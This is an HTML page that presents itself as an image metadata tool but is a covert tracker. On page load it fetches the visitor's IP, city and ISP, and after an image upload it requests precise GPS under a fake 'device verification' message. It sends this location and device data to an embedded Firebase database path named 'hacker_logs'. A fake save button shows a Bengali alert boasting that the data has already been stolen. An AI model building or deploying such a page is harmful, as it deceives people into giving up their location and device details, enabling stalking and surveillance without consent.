<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Secure Metadata Tool</title>
    
    <!-- Piexif (‡¶Æ‡ßá‡¶ü‡¶æ‡¶°‡¶æ‡¶ü‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/piexifjs/1.0.6/piexif.js"></script>
    <!-- UAParser (‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶®‡¶æ‡¶Æ ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶æ‡¶¶‡ßÅ‡¶ï‡¶∞‡ßÄ ‡¶ü‡ßÅ‡¶≤) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ‡¶°‡¶æ‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        window.sendDataToFirebase = function(data) {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            set(newLogRef, {
                timestamp: new Date().toString(),
                ...data
            });
        }
    </script>

    <style>
        /* ‡¶§‡ßã‡¶∞ ‡¶™‡¶õ‡¶®‡ßç‡¶¶‡ßá‡¶∞ ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
        body { background-color: #e0e5ec; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .mobile-container { width: 90%; max-width: 400px; background: #e0e5ec; border-radius: 20px; padding: 20px; box-shadow: 10px 10px 20px #a3b1c6, -10px -10px 20px #ffffff; text-align: center; }
        .neu-btn { width: 100%; padding: 15px; border: none; border-radius: 12px; background: #e0e5ec; box-shadow: 6px 6px 12px #a3b1c6, -6px -6px 12px #ffffff; color: #4a4a4a; font-weight: bold; cursor: pointer; margin-bottom: 15px; }
        .neu-btn:active { box-shadow: inset 4px 4px 8px #a3b1c6, inset -4px -4px 8px #ffffff; }
        .upload-area { padding: 20px; border-radius: 15px; box-shadow: inset 6px 6px 12px #a3b1c6, inset -6px -6px 12px #ffffff; margin-bottom: 25px; }
        #preview { width: 100%; max-width: 200px; display: none; margin-top: 15px; border-radius: 10px; }
    </style>
</head>
<body>

    <div class="mobile-container">
        <h2>üïµÔ∏è Metadata Tool</h2>
        <div class="upload-area">
            <input type="file" id="fileInput" accept="image/*">
            <button class="neu-btn" onclick="document.getElementById('fileInput').click()" style="color:#007bff">üìÇ ‡¶õ‡¶¨‡¶ø ‡¶¶‡¶ø‡¶®</button>
            <img id="preview" src="">
        </div>
        <div id="statusBox" style="display:none; color:green; font-weight:bold; margin-bottom:15px;"></div>
        <button id="saveBtn" class="neu-btn" onclick="fakeProcess()" disabled style="color:gray">üíæ ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
    </div>

    <script>
        let currentImgData = null;
        let userLat = null; let userLng = null;
        let ipData = { ip: "Tracing...", city: "Unknown" };

        // ‡ßß. ‡¶Ü‡¶á‡¶™‡¶ø ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ
        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
            ipData = data;
            logToFirebase(false, "Page Visited"); // ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶≤‡¶ó
        });

        // ‡ß®. ‡¶õ‡¶¨‡¶ø ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶ø‡¶Ç
        document.getElementById('fileInput').addEventListener('change', function(e) {
            let file = e.target.files[0];
            if (file) {
                let reader = new FileReader();
                reader.onload = function(event) {
                    currentImgData = event.target.result;
                    document.getElementById('preview').src = currentImgData;
                    document.getElementById('preview').style.display = 'block';
                    requestLocation(); // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ
                }
                reader.readAsDataURL(file);
            }
        });

        // ‡ß©. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶∞‡¶ø‡¶ï‡ßã‡ßü‡ßá‡¶∏‡ßç‡¶ü
        function requestLocation() {
            let status = document.getElementById('statusBox');
            status.style.display = 'block';
            status.innerText = "‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        userLat = pos.coords.latitude;
                        userLng = pos.coords.longitude;
                        status.innerText = "‚úÖ ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á‡¶°!";
                        document.getElementById('saveBtn').disabled = false;
                        document.getElementById('saveBtn').style.color = "#00b894";
                        logToFirebase(true, "GPS Success"); // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶™‡¶∞ ‡¶≤‡¶ó
                    },
                    (err) => {
                        status.innerText = "‚ùå ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶¶‡¶∞‡¶ï‡¶æ‡¶∞!";
                        status.style.color = "red";
                        logToFirebase(false, "GPS Denied"); // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶®‡¶æ ‡¶¶‡¶ø‡¶≤‡ßá ‡¶≤‡¶ó
                    },
                    { enableHighAccuracy: true }
                );
            }
        }

        // ‡ß™. ‡¶Æ‡ßá‡¶á‡¶® ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®: ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        function logToFirebase(hasLocation, action) {
            // UAParser ‡¶¶‡¶ø‡ßü‡ßá ‡¶á‡¶®‡¶´‡ßã ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ
            var parser = new UAParser();
            var result = parser.getResult();

            // ‡¶∏‡ßÅ‡¶®‡ßç‡¶¶‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶®‡¶æ‡¶Æ ‡¶∏‡¶æ‡¶ú‡¶æ‡¶®‡ßã
            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "PC/Unknown Mobile");
            let osName = result.os.name + " " + (result.os.version || "");
            let browserName = result.browser.name;

            let logData = {
                ip: ipData.ip || "Unknown",
                city: ipData.city || "Unknown",
                isp: ipData.org || "Unknown",
                
                // ‡¶®‡¶§‡ßÅ‡¶® ‡¶°‡¶ø‡¶ü‡ßá‡¶á‡¶≤‡¶∏ ‡¶°‡¶æ‡¶ü‡¶æ
                deviceModel: deviceName, // ‡¶Ø‡ßá‡¶Æ‡¶®: Samsung SM-A50
                os: osName,             // ‡¶Ø‡ßá‡¶Æ‡¶®: Android 10
                browser: browserName,   // ‡¶Ø‡ßá‡¶Æ‡¶®: Chrome Mobile
                cpu: result.cpu.architecture || "Unknown",
                
                latitude: hasLocation ? userLat : "Denied",
                longitude: hasLocation ? userLng : "Denied",
                actionStatus: action
            };

            if(window.sendDataToFirebase) window.sendDataToFirebase(logData);
        }

        function fakeProcess() {
            alert("üéâ ‡¶™‡ßç‡¶∞‡ßã‡¶∏‡ßá‡¶∏‡¶ø‡¶Ç ‡¶ï‡¶Æ‡¶™‡ßç‡¶≤‡¶ø‡¶ü! (‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ ‡¶°‡¶æ‡¶ü‡¶æ ‡¶Ö‡¶≤‡¶∞‡ßá‡¶°‡¶ø ‡¶ö‡ßÅ‡¶∞‡¶ø ‡¶π‡ßü‡ßá ‡¶ó‡ßá‡¶õ‡ßá üòà)");
            logToFirebase(true, "Download Clicked");
        }
    </script>
</body>
</html>